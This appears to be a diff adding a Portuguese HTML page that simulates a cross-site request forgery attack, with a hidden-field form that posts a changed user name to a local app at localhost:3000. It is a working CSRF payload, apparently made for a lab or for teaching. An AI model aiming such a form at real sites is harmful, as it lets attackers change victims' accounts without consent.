@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simulação de Ataque CSRF</title>
+</head>
+<body>
+    <h1>Simulação de Ataque CSRF</h1>
+    <p>Este formulário tenta atualizar o nome do usuário sem validação de CSRF.</p>
+
+    <form action="http://localhost:3000/atualizar-usuario" method="POST">
+        <input type="hidden" name="id" value="1"> <!-- ID do usuário a ser atualizado -->
+        <input type="hidden" name="nome" value="CSRF Attack"> <!-- Novo nome -->
+        <button type="submit">Atualizar Nome</button>
+    </form>
+
+</body>
+</html>
